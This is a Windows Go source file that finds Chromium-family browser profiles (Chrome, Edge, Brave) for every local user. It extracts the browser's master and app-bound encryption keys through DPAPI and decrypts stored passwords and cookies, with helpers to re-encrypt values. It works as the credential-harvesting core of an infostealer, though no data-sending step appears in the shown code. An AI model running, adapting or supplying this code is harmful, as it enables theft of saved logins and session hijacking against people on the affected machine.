//go:build windows

package win32

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

type ChromeProfile struct {
	Browser    string
	Name       string
	Dir        string
	LoginData  string
	Cookies    string
	LocalState string
}

func chromUserDataDirs() []string {
	seen := make(map[string]bool, 8)
	present := make([]string, 0, 8)

	for _, localAppData := range localAppDataDirs() {
		candidates := []string{
			filepath.Join(localAppData, "Google", "Chrome", "User Data"),
			filepath.Join(localAppData, "Microsoft", "Edge", "User Data"),
			filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "User Data"),
		}
		for _, candidate := range candidates {
			if seen[candidate] {
				continue
			}
			seen[candidate] = true
			if info, err := os.Stat(candidate); err == nil && info.IsDir() {
				present = append(present, candidate)
			}
		}
	}
	return present
}

func localAppDataDirs() []string {
	dirs := make([]string, 0, 4)
	seen := make(map[string]bool, 4)

	add := func(dir string) {
		if dir == "" {
			return
		}
		key := strings.ToLower(dir)
		if seen[key] {
			return
		}
		seen[key] = true
		dirs = append(dirs, dir)
	}

	add(os.Getenv("LOCALAPPDATA"))

	base := filepath.Join(os.Getenv("SystemDrive")+`\`, "Users")
	if os.Getenv("SystemDrive") == "" {
		base = `C:\Users`
	}
	entries, err := os.ReadDir(base)
	if err != nil {
		return dirs
	}
	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		switch strings.ToLower(entry.Name()) {
		case "default", "default user", "public", "all users":
			continue
		}
		add(filepath.Join(base, entry.Name(), "AppData", "Local"))
	}
	return dirs
}

func ChromeProfiles() []ChromeProfile {
	profiles := make([]ChromeProfile, 0, 8)
	for _, userData := range chromUserDataDirs() {
		browser := filepath.Base(filepath.Dir(userData))
		entries, err := os.ReadDir(userData)
		if err != nil {
			continue
		}
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			dir := filepath.Join(userData, entry.Name())
			loginData := filepath.Join(dir, "Login Data")
			cookies := filepath.Join(dir, "Network", "Cookies")

			hasLogins := false
			if info, statErr := os.Stat(loginData); statErr == nil && info.Size() > 0 {
				hasLogins = true
			}
			hasCookies := false
			if info, statErr := os.Stat(cookies); statErr == nil && info.Size() > 0 {
				hasCookies = true
			}
			if !hasLogins && !hasCookies {
				continue
			}

			profiles = append(profiles, ChromeProfile{
				Browser:    browser,
				Name:       browser + "/" + entry.Name(),
				Dir:        dir,
				LoginData:  loginData,
				Cookies:    cookies,
				LocalState: filepath.Join(userData, "Local State"),
			})
		}
	}
	return profiles
}

type localStateFile struct {
	OSCrypt struct {
		EncryptedKey      string `json:"encrypted_key"`
		AppBoundEncrypted string `json:"app_bound_encrypted_key"`
	} `json:"os_crypt"`
}

func ChromeScan() []string {
	out := make([]string, 0, 8)
	for _, userData := range chromUserDataDirs() {
		browser := filepath.Base(filepath.Dir(userData))
		entries, err := os.ReadDir(userData)
		if err != nil {
			out = append(out, browser+": no se pudo leer User Data")
			continue
		}
		for _, entry := range entries {
			if !entry.IsDir() {
				continue
			}
			dir := filepath.Join(userData, entry.Name())
			line := browser + "/" + entry.Name() + ":"
			found := false

			loginData := filepath.Join(dir, "Login Data")
			if info, statErr := os.Stat(loginData); statErr == nil {
				line += fmt.Sprintf(" Login Data %d bytes", info.Size())
				found = true
			}
			cookies := filepath.Join(dir, "Network", "Cookies")
			if info, statErr := os.Stat(cookies); statErr == nil {
				line += fmt.Sprintf(" Cookies %d bytes", info.Size())
				found = true
			}
			if !found {
				continue
			}
			out = append(out, line)
		}
	}
	if len(out) == 0 {
		out = append(out, "ningÃºn navegador Chromium con datos en LOCALAPPDATA")
	}
	return out
}

type ChromeKeys struct {
	User        []byte
	AppBound    []byte
	AppBoundErr error
}

func ChromeKeysFromLocalState(localStatePath string) (ChromeKeys, error) {
	var keys ChromeKeys

	raw, err := os.ReadFile(localStatePath)
	if err != nil {
		return keys, fmt.Errorf("chrome: Local State: %w", err)
	}

	var state localStateFile
	if err := json.Unmarshal(raw, &state); err != nil {
		return keys, fmt.Errorf("chrome: Local State invÃ¡lido: %w", err)
	}

	var errs []error

	if encoded := state.OSCrypt.EncryptedKey; encoded != "" {
		key, keyErr := userKeyFromBase64(encoded)
		if keyErr != nil {
			errs = append(errs, keyErr)
		} else {
			keys.User = key
		}
	}

	if encoded := state.OSCrypt.AppBoundEncrypted; encoded != "" {
		key, keyErr := appBoundKeyFromBase64(encoded)
		if keyErr != nil {
			keys.AppBoundErr = keyErr
			errs = append(errs, keyErr)
		} else {
			keys.AppBound = key
		}
	}

	if keys.User == nil && keys.AppBound == nil {
		if len(errs) == 0 {
			errs = append(errs, errors.New("chrome: Local State sin claves os_crypt"))
		}
		return keys, errors.Join(errs...)
	}
	return keys, nil
}

func userKeyFromBase64(encoded string) ([]byte, error) {
	blob, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("chrome: clave base64: %w", err)
	}
	if len(blob) <= 5 || string(blob[:5]) != "DPAPI" {
		return nil, errors.New("chrome: la clave no lleva prefijo DPAPI")
	}
	key, err := DPAPIUnprotect(blob[5:])
	if err != nil {
		return nil, err
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("chrome: clave de %d bytes, se esperaban 32", len(key))
	}
	return key, nil
}

func appBoundKeyFromBase64(encoded string) ([]byte, error) {
	blob, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return nil, fmt.Errorf("chrome: app-bound base64: %w", err)
	}
	if len(blob) <= 4 || string(blob[:4]) != "APPB" {
		return nil, errors.New("chrome: la clave app-bound no lleva prefijo APPB")
	}
	inner, err := DPAPIUnprotectMachine(blob[4:])
	if err != nil {
		return nil, fmt.Errorf("chrome: clave app-bound mÃ¡quina: %w", err)
	}
	key, err := DPAPIUnprotect(inner)
	if err != nil {
		return nil, fmt.Errorf("chrome: clave app-bound usuario: %w", err)
	}
	if len(key) != 32 {
		return nil, fmt.Errorf("chrome: clave app-bound de %d bytes", len(key))
	}
	return key, nil
}

func ChromeMasterKey(localStatePath string) ([]byte, error) {
	keys, err := ChromeKeysFromLocalState(localStatePath)
	if keys.User != nil {
		return keys.User, nil
	}
	if err != nil {
		return nil, err
	}
	return nil, errors.New("chrome: sin clave de usuario")
}

func DecryptChromeValue(blob, key []byte) (string, error) {
	if len(blob) == 0 {
		return "", errors.New("chrome: valor vacÃ­o")
	}

	prefix := ""
	if len(blob) >= 3 {
		prefix = string(blob[:3])
	}

	switch prefix {
	case "v10", "v11", "v20":
		return decryptGCM(blob, key)
	default:
		plain, err := DPAPIUnprotect(blob)
		if err != nil {
			return "", err
		}
		return strings.TrimRight(string(plain), "\x00"), nil
	}
}

func DecryptChromeValueWith(blob []byte, keys ChromeKeys) (string, error) {
	if len(blob) == 0 {
		return "", errors.New("chrome: valor vacÃ­o")
	}

	prefix := ""
	if len(blob) >= 3 {
		prefix = string(blob[:3])
	}

	switch prefix {
	case "v20":
		if len(keys.AppBound) != 32 {
			return "", errors.New("chrome: valor v20 sin clave app-bound (Â¿Chrome elevado o SYSTEM?)")
		}
		return decryptAppBound(blob, keys.AppBound)
	case "v10", "v11":
		if len(keys.User) != 32 {
			return "", errors.New("chrome: valor v10 sin clave de usuario")
		}
		return decryptGCM(blob, keys.User)
	default:
		plain, err := DPAPIUnprotect(blob)
		if err != nil {
			return "", err
		}
		return strings.TrimRight(string(plain), "\x00"), nil
	}
}

func decryptAppBound(blob, key []byte) (string, error) {
	raw, err := decryptGCMRaw(blob, key)
	if err != nil {
		return "", err
	}
	if len(raw) > appBoundKeyBytes {
		raw = raw[appBoundKeyBytes:]
	}
	return strings.TrimRight(string(raw), "\x00"), nil
}

func decryptGCM(blob, key []byte) (string, error) {
	raw, err := decryptGCMRaw(blob, key)
	if err != nil {
		return "", err
	}
	return strings.TrimRight(string(raw), "\x00"), nil
}

func EncryptChromeValue(plain string, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("chrome: clave AES invÃ¡lida")
	}
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := rand.Read(nonce); err != nil {
		return nil, err
	}

	out := make([]byte, 0, 3+len(nonce)+len(plain)+gcm.Overhead())
	out = append(out, 'v', '1', '0')
	out = append(out, nonce...)
	return gcm.Seal(out, nonce, []byte(plain), nil), nil
}

func decryptGCMRaw(blob, key []byte) ([]byte, error) {
	if len(key) != 32 {
		return nil, errors.New("chrome: clave AES invÃ¡lida")
	}
	if len(blob) < 3+12+16 {
		return nil, errors.New("chrome: valor cifrado demasiado corto")
	}
	nonce := blob[3:15]
	ciphertext := blob[15:]
	tag := ciphertext[len(ciphertext)-16:]
	body := ciphertext[:len(ciphertext)-16]

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	sealed := make([]byte, 0, len(body)+len(tag))
	sealed = append(sealed, body...)
	sealed = append(sealed, tag...)

	plain, err := gcm.Open(nil, nonce, sealed, nil)
	if err != nil {
		return nil, fmt.Errorf("chrome: GCM: %w", err)
	}
	return plain, nil
}
